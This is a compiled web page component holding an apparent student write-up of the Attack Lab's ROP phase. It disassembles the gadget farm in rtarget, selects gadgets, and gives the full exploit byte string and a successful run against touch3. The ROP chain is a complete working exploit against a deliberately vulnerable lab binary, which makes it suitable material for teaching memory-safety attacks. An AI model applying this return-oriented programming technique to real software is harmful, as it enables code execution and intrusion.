import{_ as e,X as d,Y as i,a1 as n}from"./framework-9435e890.js";const l={},a=n(`<h6 id="run" tabindex="-1"><a class="header-anchor" href="#run" aria-hidden="true">#</a> Run</h6><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>objdump <span class="token parameter variable">--disassemble</span> rtarget <span class="token operator">&gt;</span> rtarget.asm
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="read-file-rtarget-asm" tabindex="-1"><a class="header-anchor" href="#read-file-rtarget-asm" aria-hidden="true">#</a> Read File <code>rtarget.asm</code></h6><div class="language-assembly line-numbers-mode" data-ext="assembly"><pre class="language-assembly"><code>...
0000000000401c78 &lt;touch3&gt;:
...
0000000000401d0f &lt;start_farm&gt;:
  401d0f:	b8 01 00 00 00       	mov    $0x1,%eax
  401d14:	c3                   	retq

0000000000401d15 &lt;addval_420&gt;:
  401d15:	8d 87 48 89 c7 94    	lea    -0x6b3876b8(%rdi),%eax
  401d1b:	c3                   	retq

0000000000401d1c &lt;setval_146&gt;:
  401d1c:	c7 07 58 92 90 90    	movl   $0x90909258,(%rdi)
  401d22:	c3                   	retq

0000000000401d23 &lt;addval_451&gt;:
  401d23:	8d 87 00 58 c3 1c    	lea    0x1cc35800(%rdi),%eax
  401d29:	c3                   	retq

0000000000401d2a &lt;addval_158&gt;:
  401d2a:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  401d30:	c3                   	retq

0000000000401d31 &lt;setval_387&gt;:
  401d31:	c7 07 58 c3 08 57    	movl   $0x5708c358,(%rdi)
  401d37:	c3                   	retq

0000000000401d38 &lt;getval_439&gt;:
  401d38:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
  401d3d:	c3                   	retq

0000000000401d3e &lt;getval_205&gt;:
  401d3e:	b8 b7 d7 58 c2       	mov    $0xc258d7b7,%eax
  401d43:	c3                   	retq

0000000000401d44 &lt;setval_398&gt;:
  401d44:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  401d4a:	c3                   	retq

0000000000401d4b &lt;mid_farm&gt;:
  401d4b:	b8 01 00 00 00       	mov    $0x1,%eax
  401d50:	c3                   	retq

0000000000401d51 &lt;add_xy&gt;:
  401d51:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  401d55:	c3                   	retq

0000000000401d56 &lt;getval_493&gt;:
  401d56:	b8 89 c1 08 d2       	mov    $0xd208c189,%eax
  401d5b:	c3                   	retq

0000000000401d5c &lt;getval_480&gt;:
  401d5c:	b8 89 d6 08 db       	mov    $0xdb08d689,%eax
  401d61:	c3                   	retq

0000000000401d62 &lt;getval_269&gt;:
  401d62:	b8 89 ca 60 c9       	mov    $0xc960ca89,%eax
  401d67:	c3                   	retq

0000000000401d68 &lt;getval_133&gt;:
  401d68:	b8 5e 48 88 e0       	mov    $0xe088485e,%eax
  401d6d:	c3                   	retq

0000000000401d6e &lt;addval_307&gt;:
  401d6e:	8d 87 99 c1 20 c9    	lea    -0x36df3e67(%rdi),%eax
  401d74:	c3                   	retq

0000000000401d75 &lt;addval_127&gt;:
  401d75:	8d 87 81 d6 84 d2    	lea    -0x2d7b297f(%rdi),%eax
  401d7b:	c3                   	retq

0000000000401d7c &lt;addval_116&gt;:
  401d7c:	8d 87 89 c1 90 90    	lea    -0x6f6f3e77(%rdi),%eax
  401d82:	c3                   	retq

0000000000401d83 &lt;addval_120&gt;:
  401d83:	8d 87 2e 48 88 e0    	lea    -0x1f77b7d2(%rdi),%eax
  401d89:	c3                   	retq

0000000000401d8a &lt;getval_260&gt;:
  401d8a:	b8 a9 d6 20 c0       	mov    $0xc020d6a9,%eax
  401d8f:	c3                   	retq

0000000000401d90 &lt;getval_400&gt;:
  401d90:	b8 48 89 e0 c3       	mov    $0xc3e08948,%eax
  401d95:	c3                   	retq

0000000000401d96 &lt;addval_196&gt;:
  401d96:	8d 87 c9 c1 20 db    	lea    -0x24df3e37(%rdi),%eax
  401d9c:	c3                   	retq

0000000000401d9d &lt;setval_327&gt;:
  401d9d:	c7 07 89 c1 00 d2    	movl   $0xd200c189,(%rdi)
  401da3:	c3                   	retq

0000000000401da4 &lt;getval_253&gt;:
  401da4:	b8 89 d6 00 db       	mov    $0xdb00d689,%eax
  401da9:	c3                   	retq

0000000000401daa &lt;setval_300&gt;:
  401daa:	c7 07 81 c1 20 c0    	movl   $0xc020c181,(%rdi)
  401db0:	c3                   	retq

0000000000401db1 &lt;getval_176&gt;:
  401db1:	b8 48 89 e0 94       	mov    $0x94e08948,%eax
  401db6:	c3                   	retq

0000000000401db7 &lt;setval_430&gt;:
  401db7:	c7 07 4a 09 ca 90    	movl   $0x90ca094a,(%rdi)
  401dbd:	c3                   	retq

0000000000401dbe &lt;getval_168&gt;:
  401dbe:	b8 89 ca 20 db       	mov    $0xdb20ca89,%eax
  401dc3:	c3                   	retq

0000000000401dc4 &lt;getval_337&gt;:
  401dc4:	b8 89 ca 28 db       	mov    $0xdb28ca89,%eax
  401dc9:	c3                   	retq

0000000000401dca &lt;setval_190&gt;:
  401dca:	c7 07 c9 c1 84 db    	movl   $0xdb84c1c9,(%rdi)
  401dd0:	c3                   	retq

0000000000401dd1 &lt;addval_479&gt;:
  401dd1:	8d 87 89 d6 90 c3    	lea    -0x3c6f2977(%rdi),%eax
  401dd7:	c3                   	retq

0000000000401dd8 &lt;getval_448&gt;:
  401dd8:	b8 89 ca c3 99       	mov    $0x99c3ca89,%eax
  401ddd:	c3                   	retq

0000000000401dde &lt;addval_105&gt;:
  401dde:	8d 87 48 89 e0 92    	lea    -0x6d1f76b8(%rdi),%eax
  401de4:	c3                   	retq

0000000000401de5 &lt;getval_267&gt;:
  401de5:	b8 b2 48 89 e0       	mov    $0xe08948b2,%eax
  401dea:	c3                   	retq

0000000000401deb &lt;getval_311&gt;:
  401deb:	b8 09 d6 90 c3       	mov    $0xc390d609,%eax
  401df0:	c3                   	retq

0000000000401df1 &lt;addval_404&gt;:
  401df1:	8d 87 48 8b e0 c3    	lea    -0x3c1f74b8(%rdi),%eax
  401df7:	c3                   	retq

0000000000401df8 &lt;setval_115&gt;:
  401df8:	c7 07 a9 d6 08 c0    	movl   $0xc008d6a9,(%rdi)
  401dfe:	c3                   	retq

0000000000401dff &lt;addval_306&gt;:
  401dff:	8d 87 99 ca 20 d2    	lea    -0x2ddf3567(%rdi),%eax
  401e05:	c3                   	retq

0000000000401e06 &lt;addval_170&gt;:
  401e06:	8d 87 48 89 e0 94    	lea    -0x6b1f76b8(%rdi),%eax
  401e0c:	c3                   	retq

0000000000401e0d &lt;addval_257&gt;:
  401e0d:	8d 87 89 c1 18 db    	lea    -0x24e73e77(%rdi),%eax
  401e13:	c3                   	retq

0000000000401e14 &lt;addval_325&gt;:
  401e14:	8d 87 8d ca 08 c9    	lea    -0x36f73573(%rdi),%eax
  401e1a:	c3                   	retq

0000000000401e1b &lt;getval_109&gt;:
  401e1b:	b8 99 d6 84 c9       	mov    $0xc984d699,%eax
  401e20:	c3                   	retq

0000000000401e21 &lt;setval_488&gt;:
  401e21:	c7 07 a1 a9 ca 90    	movl   $0x90caa9a1,(%rdi)
  401e27:	c3                   	retq

0000000000401e28 &lt;end_farm&gt;:
...
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="design-gadget" tabindex="-1"><a class="header-anchor" href="#design-gadget" aria-hidden="true">#</a> Design Gadget</h6><div class="language-assembly line-numbers-mode" data-ext="assembly"><pre class="language-assembly"><code>48 89 e0     movq %rsp, %rax
48 89 c7     movq %rax, %rdi
58           popq %rax
89 c1        movl %eax, %ecx
89 ca        movl %ecx, %edx
89 d6        movl %edx, %esi
48 8d 04 37  lea (%rdi,%rsi,1),%rax
48 89 c7     movq %rax, %rdi
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="search-gadget-in-rtarget-asm" tabindex="-1"><a class="header-anchor" href="#search-gadget-in-rtarget-asm" aria-hidden="true">#</a> Search Gadget in <code>rtarget.asm</code></h6><div class="language-assembly line-numbers-mode" data-ext="assembly"><pre class="language-assembly"><code>0000000000401d90 &lt;getval_400&gt;:
  401d90:	b8 48 89 e0 c3       	mov    $0xc3e08948,%eax
  401d95:	c3                   	retq
0000000000401d2a &lt;addval_158&gt;:
  401d2a:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  401d30:	c3                   	retq
0000000000401d23 &lt;addval_451&gt;:
  401d23:	8d 87 00 58 c3 1c    	lea    0x1cc35800(%rdi),%eax
  401d29:	c3                   	retq
0000000000401d7c &lt;addval_116&gt;:
  401d7c:	8d 87 89 c1 90 90    	lea    -0x6f6f3e77(%rdi),%eax
  401d82:	c3                   	retq
0000000000401dd8 &lt;getval_448&gt;:
  401dd8:	b8 89 ca c3 99       	mov    $0x99c3ca89,%eax
  401ddd:	c3                   	retq
0000000000401dd1 &lt;addval_479&gt;:
  401dd1:	8d 87 89 d6 90 c3    	lea    -0x3c6f2977(%rdi),%eax
  401dd7:	c3                   	retq
0000000000401d51 &lt;add_xy&gt;:
  401d51:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  401d55:	c3                   	retq
0000000000401d2a &lt;addval_158&gt;:
  401d2a:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  401d30:	c3                   	retq
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="design-rop" tabindex="-1"><a class="header-anchor" href="#design-rop" aria-hidden="true">#</a> Design ROP</h6><div class="language-assembly line-numbers-mode" data-ext="assembly"><pre class="language-assembly"><code>0000000000401d91: 48 89 e0 c3     movq %rsp, %rax
0000000000401d2c: 48 89 c7 c3     movq %rax, %rdi
0000000000401d26: 58 c3           popq %rax
0000000000401d7e: 89 c1 90 90 c3  movl %eax, %ecx
0000000000401dd9: 89 ca c3        movl %ecx, %edx
0000000000401dd3: 89 d6           movl %edx, %esi
0000000000401d51: 48 8d 04 37 c3  lea (%rdi,%rsi,1),%rax
0000000000401d2c: 48 89 c7        movq %rax, %rdi
0000000000401c78:                 &lt;touch3&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="read-file-cookie-txt" tabindex="-1"><a class="header-anchor" href="#read-file-cookie-txt" aria-hidden="true">#</a> Read File <code>cookie.txt</code></h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>0x3a9a6c2f
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="convert-cookie-to-string" tabindex="-1"><a class="header-anchor" href="#convert-cookie-to-string" aria-hidden="true">#</a> Convert Cookie to String</h6><p>The string should end with a <code>\\0</code>.</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>33 61 39 61 36 63 32 66 00
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="write-file-phase-5-txt" tabindex="-1"><a class="header-anchor" href="#write-file-phase-5-txt" aria-hidden="true">#</a> Write File <code>phase-5.txt</code></h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
91 1d 40 00 00 00 00 00
2c 1d 40 00 00 00 00 00
26 1d 40 00 00 00 00 00
48 00 00 00 00 00 00 00
7e 1d 40 00 00 00 00 00
d9 1d 40 00 00 00 00 00
d3 1d 40 00 00 00 00 00
51 1d 40 00 00 00 00 00
2c 1d 40 00 00 00 00 00
78 1c 40 00 00 00 00 00
33 61 39 61 36 63 32 66 00
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-1" tabindex="-1"><a class="header-anchor" href="#run-1" aria-hidden="true">#</a> Run</h6><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>./hex2raw <span class="token operator">&lt;</span> phase-5.txt <span class="token operator">&gt;</span> phase-5.in
./rtarget <span class="token parameter variable">-i</span> phase-5.in
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="terminal-output" tabindex="-1"><a class="header-anchor" href="#terminal-output" aria-hidden="true">#</a> Terminal Output</h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Cookie: 0x3a9a6c2f
Touch3!: You called touch3(&quot;3a9a6c2f&quot;)
Valid solution for level 3 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,21),s=[a];function v(t,c){return d(),i("div",null,s)}const b=e(l,[["render",v],["__file","index.html.vue"]]);export{b as default};
